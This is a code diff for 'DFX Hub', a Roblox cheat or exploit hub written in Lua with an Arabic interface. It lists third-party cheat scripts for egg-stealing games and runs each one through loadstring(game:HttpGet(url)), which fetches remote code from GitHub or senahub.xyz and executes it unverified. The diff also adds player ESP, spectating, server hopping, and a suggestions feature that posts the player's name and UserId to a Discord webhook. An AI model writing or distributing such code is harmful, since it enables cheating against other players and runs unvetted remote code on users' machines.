+            folderFrame.Size = UDim2.new(1, 0, 0, 36)
+        end
 
-            local viewBtn = Instance.new("TextButton")
-            viewBtn.Size = UDim2.new(1, -8, 0, 22)
-            viewBtn.Position = UDim2.new(0, 4, 0, 82)
-            viewBtn.BackgroundColor3 = Color3.fromRGB(180, 25, 35)
-            viewBtn.Text = "عرض السكربتات ▶"
-            viewBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            viewBtn.Font = Enum.Font.SourceSansBold
-            viewBtn.TextSize = 9.5
-            viewBtn.Parent = card
-            Instance.new("UICorner", viewBtn).CornerRadius = UDim.new(0, 4)
+        task.wait(0.05)
+        CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 25)
+    end)
+end
 
-            viewBtn.MouseButton1Click:Connect(function() openMapScripts(map) end)
+local function clearCenter()
+    for _, child in ipairs(CenterScroll:GetChildren()) do
+        if not child:IsA("UIListLayout") then
+            child:Destroy()
         end
     end
-    MapsScroll.CanvasSize = UDim2.new(0, 0, 0, MapsGrid.AbsoluteContentSize.Y + 10)
 end
 
-renderMapCards("")
-MapSearchBox:GetPropertyChangedSignal("Text"):Connect(function() renderMapCards(MapSearchBox.Text) end)
+---------------------------------------------------------
+-- التبويبات الرئيسية
+---------------------------------------------------------
+local BtnMainHome = createProStyleBtn("الرئيسية", "left")
+BtnMainHome.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    clearCenter()
+
+    local placeId = game.PlaceId
+    local placeName = "ماب روبلوكس الحالي"
+    pcall(function()
+        local info = MarketplaceService:GetProductInfo(placeId)
+        if info then placeName = info.Name end
+    end)
+
+    local mapBanner = Instance.new("ImageLabel")
+    mapBanner.Size = UDim2.new(1, 0, 0, 95)
+    mapBanner.BackgroundColor3 = Color3.fromRGB(20, 30, 50)
+    mapBanner.Image = "rbxthumb://type=Asset&id=" .. tostring(placeId) .. "&w=768&h=432"
+    mapBanner.ScaleType = Enum.ScaleType.Crop
+    mapBanner.ZIndex = 3
+    mapBanner.Parent = CenterScroll
+    Instance.new("UICorner", mapBanner).CornerRadius = UDim.new(0, 8)
+
+    local bannerTitle = Instance.new("TextLabel")
+    bannerTitle.Size = UDim2.new(1, -20, 0, 24)
+    bannerTitle.Position = UDim2.new(0, 10, 1, -28)
+    bannerTitle.BackgroundTransparency = 0.4
+    bannerTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    bannerTitle.Text = "🎮 " .. placeName
+    bannerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    bannerTitle.Font = Enum.Font.FredokaOne
+    bannerTitle.TextSize = 14
+    bannerTitle.TextXAlignment = Enum.TextXAlignment.Center
+    bannerTitle.ZIndex = 4
+    bannerTitle.Parent = mapBanner
+    Instance.new("UICorner", bannerTitle).CornerRadius = UDim.new(0, 6)
+
+    local updatesFrame = Instance.new("Frame")
+    updatesFrame.Size = UDim2.new(1, 0, 0, 115)
+    updatesFrame.BackgroundColor3 = Color3.fromRGB(16, 24, 40)
+    updatesFrame.ZIndex = 3
+    updatesFrame.Parent = CenterScroll
+    Instance.new("UICorner", updatesFrame).CornerRadius = UDim.new(0, 8)
+
+    local updatesTitle = Instance.new("TextLabel")
+    updatesTitle.Size = UDim2.new(1, -10, 0, 22)
+    updatesTitle.Position = UDim2.new(0, 5, 0, 4)
+    updatesTitle.BackgroundTransparency = 1
+    updatesTitle.Text = "✨ آخر تحديثات السكربت (v28.0):"
+    updatesTitle.TextColor3 = currentAccentColor
+    updatesTitle.Font = Enum.Font.FredokaOne
+    updatesTitle.TextSize = 14
+    updatesTitle.TextXAlignment = Enum.TextXAlignment.Right
+    updatesTitle.ZIndex = 4
+    updatesTitle.Parent = updatesFrame
+    table.insert(activeNameLabels, updatesTitle)
+
+    local updatesDesc = Instance.new("TextLabel")
+    updatesDesc.Size = UDim2.new(1, -10, 0, 85)
+    updatesDesc.Position = UDim2.new(0, 5, 0, 26)
+    updatesDesc.BackgroundTransparency = 1
+    updatesDesc.Text = "• إضافة زر التصغير (-) بجانب زر الإغلاق لتصغير السكربت إلى فقاعة مربعة.\n• إمكانية سحب الفقاعة المربعة وتحريكها بحرية في أي مكان على الشاشة.\n• خانة بحث فوري وشاشة تحميل بسكن اللاعب الحقيقي."
+    updatesDesc.TextColor3 = Color3.fromRGB(200, 225, 255)
+    updatesDesc.Font = Enum.Font.FredokaOne
+    updatesDesc.TextSize = 11.5
+    updatesDesc.TextXAlignment = Enum.TextXAlignment.Right
+    updatesDesc.TextYAlignment = Enum.TextYAlignment.Top
+    updatesDesc.ZIndex = 4
+    updatesDesc.Parent = updatesFrame
+
+    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 15)
+end)
 
 ---------------------------------------------------------
--- 4. الاقتراحات
+-- صفحات السكربتات التفصيلية (مع خانة البحث)
 ---------------------------------------------------------
-local SuggestBoxContainer = Instance.new("Frame")
-SuggestBoxContainer.Size = UDim2.new(1, -10, 0, 190)
-SuggestBoxContainer.Position = UDim2.new(0, 0, 0, 15)
-SuggestBoxContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
-SuggestBoxContainer.Parent = SuggestTab
-Instance.new("UICorner", SuggestBoxContainer).CornerRadius = UDim.new(0, 8)
+local function openScriptDetailsPage(mapName, scriptsList)
+    clearCenter()
 
-local SuggestTextBox = Instance.new("TextBox")
-SuggestTextBox.Size = UDim2.new(1, -12, 1, -12)
-SuggestTextBox.Position = UDim2.new(0, 6, 0, 6)
-SuggestTextBox.BackgroundTransparency = 1
-SuggestTextBox.PlaceholderText = "اكتب اقتراحك هنا..."
-SuggestTextBox.Text = ""
-SuggestTextBox.TextColor3 = Color3.fromRGB(220, 220, 230)
-SuggestTextBox.Font = Enum.Font.SourceSans
-SuggestTextBox.TextSize = 11
-SuggestTextBox.MultiLine = true
-SuggestTextBox.Parent = SuggestBoxContainer
+    local backBtn = Instance.new("TextButton")
+    backBtn.Size = UDim2.new(1, 0, 0, 32)
+    backBtn.BackgroundColor3 = Color3.fromRGB(25, 38, 62)
+    backBtn.Text = "⬅️ العودة لقائمة المابات"
+    backBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    backBtn.Font = Enum.Font.FredokaOne
+    backBtn.TextSize = 13
+    backBtn.ZIndex = 3
+    backBtn.Parent = CenterScroll
+    Instance.new("UICorner", backBtn).CornerRadius = UDim.new(0, 6)
 
-local SendSuggestBtn = Instance.new("TextButton")
-SendSuggestBtn.Size = UDim2.new(1, -10, 0, 30)
-SendSuggestBtn.Position = UDim2.new(0, 0, 0, 215)
-SendSuggestBtn.BackgroundColor3 = Color3.fromRGB(40, 140, 60)
-SendSuggestBtn.Text = "📩 إرسال الاقتراح"
-SendSuggestBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SendSuggestBtn.Font = Enum.Font.SourceSansBold
-SendSuggestBtn.TextSize = 11.5
-SendSuggestBtn.Parent = SuggestTab
-Instance.new("UICorner", SendSuggestBtn).CornerRadius = UDim.new(0, 6)
+    backBtn.MouseButton1Click:Connect(function()
+        playUiSound(SOUND_CLICK, 1, 0.35)
+        BtnScripts.MouseButton1Click:Fire()
+    end)
 
-SendSuggestBtn.MouseButton1Click:Connect(function()
-    if SuggestTextBox.Text ~= "" then
-        local data = {
-            sender = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name,
-            suggestion = SuggestTextBox.Text,
-            timestamp = os.time()
-        }
-        customRequest({
-            Url = FIREBASE_SUGGEST_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-        SuggestTextBox.Text = ""
-        SendSuggestBtn.Text = "✅ تم إرسال الاقتراح!"
-        task.wait(2)
-        SendSuggestBtn.Text = "📩 إرسال الاقتراح"
+    local searchBox = Instance.new("TextBox")
+    searchBox.Size = UDim2.new(1, 0, 0, 34)
+    searchBox.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+    searchBox.PlaceholderText = "🔍 ابحث عن اسم السكربت هنا..."
+    searchBox.Text = ""
+    searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    searchBox.Font = Enum.Font.FredokaOne
+    searchBox.TextSize = 13
+    searchBox.TextXAlignment = Enum.TextXAlignment.Right
+    searchBox.ZIndex = 3
+    searchBox.Parent = CenterScroll
+    Instance.new("UICorner", searchBox).CornerRadius = UDim.new(0, 6)
+
+    local searchStroke = Instance.new("UIStroke")
+    searchStroke.Color = currentAccentColor
+    searchStroke.Thickness = 1.2
+    searchStroke.Parent = searchBox
+    table.insert(registeredOptionStrokes, searchStroke)
+
+    local cardsContainer = Instance.new("Frame")
+    cardsContainer.Size = UDim2.new(1, 0, 0, 0)
+    cardsContainer.BackgroundTransparency = 1
+    cardsContainer.ZIndex = 3
+    cardsContainer.Parent = CenterScroll
+
+    local cardsLayout = Instance.new("UIListLayout")
+    cardsLayout.Padding = UDim.new(0, 8)
+    cardsLayout.Parent = cardsContainer
+
+    local function renderFilteredCards(query)
+        for _, child in ipairs(cardsContainer:GetChildren()) do
+            if not child:IsA("UIListLayout") then child:Destroy() end
+        end
+
+        for _, sData in ipairs(scriptsList) do
+            if query == "" or string.find(string.lower(sData.name), string.lower(query)) then
+                local scriptCard = Instance.new("Frame")
+                scriptCard.Size = UDim2.new(1, 0, 0, 95)
+                scriptCard.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+                scriptCard.ZIndex = 3
+                scriptCard.Parent = cardsContainer
+                Instance.new("UICorner", scriptCard).CornerRadius = UDim.new(0, 8)
+
+                local cardStroke = Instance.new("UIStroke")
+                cardStroke.Color = currentAccentColor
+                cardStroke.Thickness = 1.5
+                cardStroke.Parent = scriptCard
+                table.insert(registeredOptionStrokes, cardStroke)
+
+                local scriptTitle = Instance.new("TextLabel")
+                scriptTitle.Size = UDim2.new(1, -120, 0, 26)
+                scriptTitle.Position = UDim2.new(0, 10, 0, 8)
+                scriptTitle.BackgroundTransparency = 1
+                scriptTitle.Text = sData.name
+                scriptTitle.TextColor3 = currentAccentColor
+                scriptTitle.Font = Enum.Font.FredokaOne
+                scriptTitle.TextSize = 14
+                scriptTitle.TextXAlignment = Enum.TextXAlignment.Right
+                scriptTitle.ZIndex = 4
+                scriptTitle.Parent = scriptCard
+                table.insert(activeNameLabels, scriptTitle)
+
+                local keyTag = Instance.new("TextLabel")
+                keyTag.Size = UDim2.new(1, -120, 0, 20)
+                keyTag.Position = UDim2.new(0, 10, 0, 34)
+                keyTag.BackgroundTransparency = 1
+                keyTag.Text = "🔓 الحالة: " .. sData.keyState
+                keyTag.TextColor3 = Color3.fromRGB(80, 230, 120)
+                keyTag.Font = Enum.Font.FredokaOne
+                keyTag.TextSize = 11.5
+                keyTag.TextXAlignment = Enum.TextXAlignment.Right
+                keyTag.ZIndex = 4
+                keyTag.Parent = scriptCard
+
+                local runBtn = Instance.new("TextButton")
+                runBtn.Size = UDim2.new(0, 100, 0, 34)
+                runBtn.Position = UDim2.new(0, 10, 0.5, -17)
+                runBtn.BackgroundColor3 = currentAccentColor
+                runBtn.Text = "تشغيل 🚀"
+                runBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                runBtn.Font = Enum.Font.FredokaOne
+                runBtn.TextSize = 13.5
+                runBtn.ZIndex = 4
+                runBtn.Parent = scriptCard
+                Instance.new("UICorner", runBtn).CornerRadius = UDim.new(0, 6)
+
+                runBtn.MouseButton1Click:Connect(function()
+                    playUiSound(SOUND_CLICK, 1, 0.35)
+                    runBtn.Text = "جاري التفعيل..."
+                    pcall(function()
+                        loadstring(game:HttpGet(sData.url))()
+                    end)
+                    task.wait(1)
+                    runBtn.Text = "تم التشغيل! ✅"
+                    task.wait(2)
+                    runBtn.Text = "تشغيل 🚀"
+                end)
+            end
+        end
+
+        cardsContainer.Size = UDim2.new(1, 0, 0, cardsLayout.AbsoluteContentSize.Y + 10)
+        CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 30)
+    end
+
+    renderFilteredCards("")
+
+    searchBox:GetPropertyChangedSignal("Text"):Connect(function()
+        renderFilteredCards(searchBox.Text)
+    end)
+
+    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 30)
+end
+
+---------------------------------------------------------
+-- تبويب "سكربتات" الرئيسي
+---------------------------------------------------------
+local BtnScripts = createProStyleBtn("سكربتات", "left")
+BtnScripts.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    clearCenter()
+
+    local function addMapCard(mapTitle, mapImgUrl, scriptsList)
+        local mapCard = Instance.new("Frame")
+        mapCard.Size = UDim2.new(1, 0, 0, 140)
+        mapCard.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+        mapCard.ZIndex = 3
+        mapCard.Parent = CenterScroll
+        Instance.new("UICorner", mapCard).CornerRadius = UDim.new(0, 10)
+
+        local mapCardStroke = Instance.new("UIStroke")
+        mapCardStroke.Color = currentAccentColor
+        mapCardStroke.Thickness = 1.8
+        mapCardStroke.Parent = mapCard
+        table.insert(registeredOptionStrokes, mapCardStroke)
+
+        local mapImg = Instance.new("ImageLabel")
+        mapImg.Size = UDim2.new(1, -16, 0, 80)
+        mapImg.Position = UDim2.new(0, 8, 0, 8)
+        mapImg.BackgroundColor3 = Color3.fromRGB(25, 35, 55)
+        mapImg.Image = mapImgUrl
+        mapImg.ScaleType = Enum.ScaleType.Crop
+        mapImg.ZIndex = 4
+        mapImg.Parent = mapCard
+        Instance.new("UICorner", mapImg).CornerRadius = UDim.new(0, 8)
+
+        local mapNameLbl = Instance.new("TextLabel")
+        mapNameLbl.Size = UDim2.new(1, -110, 0, 36)
+        mapNameLbl.Position = UDim2.new(0, 100, 0, 94)
+        mapNameLbl.BackgroundTransparency = 1
+        mapNameLbl.Text = mapTitle
+        mapNameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+        mapNameLbl.Font = Enum.Font.FredokaOne
+        mapNameLbl.TextSize = 14.5
+        mapNameLbl.TextXAlignment = Enum.TextXAlignment.Right
+        mapNameLbl.ZIndex = 4
+        mapNameLbl.Parent = mapCard
+
+        local showBtn = Instance.new("TextButton")
+        showBtn.Size = UDim2.new(0, 85, 0, 30)
+        showBtn.Position = UDim2.new(0, 10, 0, 97)
+        showBtn.BackgroundColor3 = currentAccentColor
+        showBtn.Text = "عرض 👁️"
+        showBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        showBtn.Font = Enum.Font.FredokaOne
+        showBtn.TextSize = 13
+        showBtn.ZIndex = 4
+        showBtn.Parent = mapCard
+        Instance.new("UICorner", showBtn).CornerRadius = UDim.new(0, 6)
+
+        showBtn.MouseButton1Click:Connect(function()
+            playUiSound(SOUND_CLICK, 1, 0.35)
+            openScriptDetailsPage(mapTitle, scriptsList)
+        end)
+    end
+
+    addMapCard("🥚 ماب سرقة البيض", EGG_MAP_IMAGE, {
+        {name = "🌶️ سكربت فلفل (الأصلي)", keyState = "بدون مفتاح", url = "https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"},
+        {name = "💧 سكربت الأزراق (PulseZax)", keyState = "بدون مفتاح", url = "https://raw.githubusercontent.com/PulseZax/Loader/refs/heads/main/.lua"},
+        {name = "⭐ سكربت SENA V7", keyState = "بدون مفتاح (قوي جداً)", url = "https://senahub.xyz/senaloader"},
+        {name = "🍏 سكربت التفاح (ChulluHub)", keyState = "بدون مفتاح", url = "https://raw.githubusercontent.com/napun87/stealaneggv2/refs/heads/main/chulluHub.lua"}
+    })
+
+    addMapCard("💥 ماب كسر البيض", BREAK_EGG_MAP_IMAGE, {
+        {name = "⚡ سكربت كسر البيض الأساسي", keyState = "بدون مفتاح", url = "https://raw.githubusercontent.com/pooro885-droid/stealanegg/refs/heads/main/sae.lua"},
+        {name = "🔮 سكربت Serenity Hub", keyState = "بدون مفتاح", url = "https://raw.githubusercontent.com/MUshihara/Serenity-hub/main/loader.lua"}
+    })
+
+    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 20)
+end)
+
+local BtnActivations = createProStyleBtn("تفعيلات", "left")
+BtnActivations.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    clearCenter()
+
+    addChilliAccordion("رادار المراقبة وكشف الأماكن (Pro ESP)", function(addToggle, addAction)
+        addToggle("تفعيل كشف أماكن اللاعبين (Box + Name ESP)", function(st)
+            espEnabled = st
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer and p.Character then
+                    if espEnabled then
+                        if not p.Character:FindFirstChild("DFXProEsp") then
+                            local hl = Instance.new("Highlight")
+                            hl.Name = "DFXProEsp"
+                            hl.FillColor = currentAccentColor
+                            hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+                            hl.FillTransparency = 0.4
+                            hl.OutlineTransparency = 0
+                            hl.Parent = p.Character
+                        end
+                    else
+                        if p.Character:FindFirstChild("DFXProEsp") then p.Character.DFXProEsp:Destroy() end
+                    end
+                end
+            end
+        end)
+    end)
+
+    addChilliAccordion("مراقبة لاعبين السيرفر (Player Spectate)", function(addToggle, addAction, contentHolder)
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then
+                local pRow = Instance.new("Frame")
+                pRow.Size = UDim2.new(1, 0, 0, 42)
+                pRow.BackgroundColor3 = Color3.fromRGB(16, 26, 46)
+                pRow.ZIndex = 3
+                pRow.Parent = contentHolder
+                Instance.new("UICorner", pRow).CornerRadius = UDim.new(0, 6)
+
+                local pImg = Instance.new("ImageLabel")
+                pImg.Size = UDim2.new(0, 32, 0, 32)
+                pImg.Position = UDim2.new(1, -38, 0.5, -16)
+                pImg.BackgroundColor3 = Color3.fromRGB(25, 40, 70)
+                pImg.ZIndex = 4
+                pImg.Parent = pRow
+                Instance.new("UICorner", pImg).CornerRadius = UDim.new(0, 16)
+
+                loadAvatarThumbnail(p.UserId, pImg)
+
+                local pNameLbl = Instance.new("TextLabel")
+                pNameLbl.Size = UDim2.new(1, -120, 1, 0)
+                pNameLbl.Position = UDim2.new(0, 80, 0, 0)
+                pNameLbl.BackgroundTransparency = 1
+                pNameLbl.Text = p.DisplayName
+                pNameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+                pNameLbl.Font = Enum.Font.FredokaOne
+                pNameLbl.TextSize = 13
+                pNameLbl.TextXAlignment = Enum.TextXAlignment.Right
+                pNameLbl.ZIndex = 4
+                pNameLbl.Parent = pRow
+
+                local specBtn = Instance.new("TextButton")
+                specBtn.Size = UDim2.new(0, 65, 0, 26)
+                specBtn.Position = UDim2.new(0, 8, 0.5, -13)
+                specBtn.BackgroundColor3 = currentAccentColor
+                specBtn.Text = "مراقبة 👁️"
+                specBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+                specBtn.Font = Enum.Font.FredokaOne
+                specBtn.TextSize = 11
+                specBtn.ZIndex = 4
+                specBtn.Parent = pRow
+                Instance.new("UICorner", specBtn).CornerRadius = UDim.new(0, 5)
+
+                local isCamSpectating = false
+                specBtn.MouseButton1Click:Connect(function()
+                    playUiSound(SOUND_CLICK, 1, 0.35)
+                    isCamSpectating = not isCamSpectating
+                    if isCamSpectating then
+                        specBtn.Text = "إلغاء ❌"
+                        specBtn.BackgroundColor3 = Color3.fromRGB(220, 40, 60)
+                        if p.Character and p.Character:FindFirstChild("Humanoid") then
+                            workspace.CurrentCamera.CameraSubject = p.Character.Humanoid
+                        end
+                    else
+                        specBtn.Text = "مراقبة 👁️"
+                        specBtn.BackgroundColor3 = currentAccentColor
+                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                            workspace.CurrentCamera.CameraSubject = LocalPlayer.Character.Humanoid
+                        end
+                    end
+                end)
+            end
+        end
+    end)
+
+    addChilliAccordion("تغيير السيرفر (Server Hop)", function(addToggle, addAction)
+        addAction("الانتقال لسيرفر آخر عشوائي 🔄", function()
+            local Http = game:GetService("HttpService")
+            local TPS = game:GetService("TeleportService")
+            local Api = "https://games.roblox.com/v1/games/"
+            local _place = game.PlaceId
+            local _servers = Api .. _place .. "/servers/Public?sortOrder=Asc&limit=100"
+            pcall(function()
+                local raw = game:HttpGet(_servers)
+                local decoded = Http:JSONDecode(raw)
+                if decoded and decoded.data then
+                    for _, s in ipairs(decoded.data) do
+                        if s.playing ~= s.maxPlayers and s.id ~= game.JobId then
+                            TPS:TeleportToPlaceInstance(_place, s.id, LocalPlayer)
+                            break
+                        end
+                    end
+                end
+            end)
+        end)
+    end)
+
+    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 15)
+end)
+
+local BtnSuggestions = createProStyleBtn("اقتراحات", "left")
+BtnSuggestions.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    clearCenter()
+
+    local sugBox = Instance.new("TextBox")
+    sugBox.Size = UDim2.new(1, 0, 0, 120)
+    sugBox.BackgroundColor3 = Color3.fromRGB(16, 24, 40)
+    sugBox.PlaceholderText = "اكتب اقتراحك هنا وسوف يصل مباشرة للمطور عبر الديسكورد..."
+    sugBox.Text = ""
+    sugBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    sugBox.Font = Enum.Font.FredokaOne
+    sugBox.TextSize = 13
+    sugBox.TextWrapped = true
+    sugBox.TextYAlignment = Enum.TextYAlignment.Top
+    sugBox.TextXAlignment = Enum.TextXAlignment.Right
+    sugBox.ZIndex = 3
+    sugBox.Parent = CenterScroll
+    Instance.new("UICorner", sugBox).CornerRadius = UDim.new(0, 8)
+
+    local sendSugBtn = Instance.new("TextButton")
+    sendSugBtn.Size = UDim2.new(1, 0, 0, 36)
+    sendSugBtn.BackgroundColor3 = currentAccentColor
+    sendSugBtn.Text = "إرسال الاقتراح الآن 🚀"
+    sendSugBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    sendSugBtn.Font = Enum.Font.FredokaOne
+    sendSugBtn.TextSize = 15
+    sendSugBtn.ZIndex = 3
+    sendSugBtn.Parent = CenterScroll
+    Instance.new("UICorner", sendSugBtn).CornerRadius = UDim.new(0, 8)
+
+    sendSugBtn.MouseButton1Click:Connect(function()
+        if sugBox.Text ~= "" then
+            local textToSend = sugBox.Text
+            sugBox.Text = ""
+            sendSugBtn.Text = "جاري الإرسال..."
+            pcall(function()
+                customRequest({
+                    Url = DISCORD_WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        embeds = {{
+                            title = "💡 اقتراح جديد من مستخدم DFX Hub",
+                            description = textToSend,
+                            color = 43775,
+                            fields = {
+                                {name = "اللاعب", value = LocalPlayer.Name, inline = true},
+                                {name = "الـ ID", value = tostring(LocalPlayer.UserId), inline = true}
+                            }
+                        }}
+                    })
+                })
+            end)
+            sendSugBtn.Text = "تم الإرسال بنجاح! ⭐"
+            task.wait(2)
+            sendSugBtn.Text = "إرسال الاقتراح الآن 🚀"
+        end
+    end)
+
+    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 15)
+end)
+
+if LocalPlayer.Name == "Dms921" then
+    local BtnAdmin = createProStyleBtn("لوحة الأدمن", "right")
+    BtnAdmin.MouseButton1Click:Connect(function()
+        playUiSound(SOUND_CLICK, 1, 0.35)
+        clearCenter()
+
+        addChilliAccordion("أدوات أدمن DFX الحصرية", function(addToggle, addAction)
+            addAction("إرسال بث مباشر لجميع الشاشات", function() end)
+            addAction("طرد لاعبين السيرفر Kick All", function() end)
+        end)
+
+        CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 15)
+    end)
+end
+
+local BtnSettings = createProStyleBtn("الإعدادات", "right")
+BtnSettings.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    clearCenter()
+
+    addChilliAccordion("تخصيص ثيمات وألوان السكربت الشاملة", function(addToggle, addAction)
+        local function updateTheme(accent, headerCol)
+            currentAccentColor = accent
+            currentHeaderColor = headerCol
+            saveUserSettings()
+
+            centerStroke.Color = accent
+            Header.BackgroundColor3 = headerCol
+            floatStroke.Color = accent
+            chatStroke.Color = accent
+            loadStroke.Color = accent
+            BarFill.BackgroundColor3 = accent
+            minBoxStroke.Color = accent
+
+            ChatHeaderBtn1.BackgroundColor3 = accent
+            ChatHeaderBtn2.BackgroundColor3 = accent
+            ChatHeaderBtn3.BackgroundColor3 = accent
+            SendBtn.BackgroundColor3 = accent
+
+            for _, stroke in ipairs(registeredWingStrokes) do
+                if stroke and stroke.Parent then stroke.Color = accent end
+            end
+            for _, stroke in ipairs(registeredOptionStrokes) do
+                if stroke and stroke.Parent then stroke.Color = accent end
+            end
+            for _, lbl in ipairs(activeNameLabels) do
+                if lbl and lbl.Parent then lbl.TextColor3 = accent end
+            end
+        end
+
+        addAction("الثيم الأزرق السماوي 🩵", function() updateTheme(Color3.fromRGB(0, 170, 255), Color3.fromRGB(0, 100, 200)) end)
+        addAction("الثيم الأحمر البركاني 🔴", function() updateTheme(Color3.fromRGB(230, 40, 60), Color3.fromRGB(160, 20, 40)) end)
+        addAction("الثيم الأرجواني 💜", function() updateTheme(Color3.fromRGB(150, 40, 255), Color3.fromRGB(110, 25, 200)) end)
+        addAction("الثيم الوردي 🩷", function() updateTheme(Color3.fromRGB(255, 100, 200), Color3.fromRGB(200, 50, 150)) end)
+        addAction("الثيم الذهبي 🟡", function() updateTheme(Color3.fromRGB(255, 200, 50), Color3.fromRGB(210, 150, 20)) end)
+        addAction("الثيم الأخضـر 🟢", function() updateTheme(Color3.fromRGB(50, 230, 100), Color3.fromRGB(20, 160, 60)) end)
+    end)
+
+    addChilliAccordion("تخصيص خلفيات واجهة السكربت Pro", function(addToggle, addAction, contentHolder)
+        addAction("❌ إغلاق خلفية السكربت", function()
+            applyScriptBackground(0)
+        end)
+
+        local gridHolder = Instance.new("Frame")
+        gridHolder.Size = UDim2.new(1, 0, 0, 210)
+        gridHolder.BackgroundTransparency = 1
+        gridHolder.ZIndex = 3
+        gridHolder.Parent = contentHolder
+
+        local gridLayout = Instance.new("UIGridLayout")
+        gridLayout.CellSize = UDim2.new(0, 150, 0, 85)
+        gridLayout.CellPadding = UDim2.new(0, 10, 0, 10)
+        gridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        gridLayout.Parent = gridHolder
+
+        for i, url in ipairs(wallUrls) do
+            local cardBtn = Instance.new("ImageButton")
+            cardBtn.Size = UDim2.new(0, 150, 0, 85)
+            cardBtn.BackgroundColor3 = Color3.fromRGB(30, 20, 50)
+            cardBtn.Image = url
+            cardBtn.ScaleType = Enum.ScaleType.Crop
+            cardBtn.ZIndex = 4
+            cardBtn.Parent = gridHolder
+            Instance.new("UICorner", cardBtn).CornerRadius = UDim.new(0, 6)
+
+            cardBtn.MouseButton1Click:Connect(function()
+                playUiSound(SOUND_CLICK, 1, 0.35)
+                applyScriptBackground(i)
+            end)
+        end
+    end)
+
+    CenterScroll.CanvasSize = UDim2.new(0, 0, 0, CenterLayout.AbsoluteContentSize.Y + 280)
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            local res = customRequest({Url = FIREBASE_CHAT_URL, Method = "GET"})
+            if res and res.StatusCode == 200 then
+                local data = safeDecode(res.Body)
+                if data then
+                    for k, m in pairs(data) do
+                        if type(m) == "table" and m.text and not renderedMsgs[k] then
+                            renderedMsgs[k] = true
+                            addChatMessage(tostring(m.sender or "مجهول"), tostring(m.text or ""), tonumber(m.userId), k)
+                        end
+                    end
+                end
+            end
+        end)
+        task.wait(2.5)
     end
 end)
+
+task.spawn(function()
+    for i = 1, 100 do
+        BarFill.Size = UDim2.new(i / 100, 0, 1, 0)
+        task.wait(0.008)
+    end
+    LoadSub.Text = "تم التحميل بنجاح!"
+    task.wait(0.15)
+    TweenService:Create(LoadFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 0, 0, 0)
+    }):Play()
+    task.wait(0.3)
+    LoadingGui:Destroy()
+
+    MainFrame.Visible = true
+    MainFrame.Size = UDim2.new(0, 0, 0, 0)
+    TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 560, 0, 360)
+    }):Play()
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    playUiSound(SOUND_CLICK, 1, 0.35)
+    TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 0, 0, 0)
+    }):Play()
+    task.wait(0.3)
+    MainFrame.Visible = false
+    MainFrame.Size = UDim2.new(0, 560, 0, 360)
+end)
+
+BtnMainHome.MouseButton1Click:Fire()
